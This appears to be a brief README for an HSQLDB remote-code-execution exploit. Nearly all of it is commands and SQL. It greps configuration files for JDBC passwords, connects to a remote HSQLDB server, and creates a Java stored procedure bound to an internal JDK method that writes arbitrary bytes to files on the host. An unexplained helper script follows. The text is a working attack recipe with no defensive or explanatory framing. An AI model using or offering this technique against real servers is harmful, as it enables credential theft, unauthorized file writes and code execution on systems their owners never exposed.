# hsqldb-rce
```
> grep -rP 'jdbc:hsqldb.*password.*' /path/to/hsqldb
> java -jar hsqldb.jar
> jdbc:hsqldb:hsql://ip/DBNAME

CREATE PROCEDURE writetofile(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))
LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'

> python parse.py
```
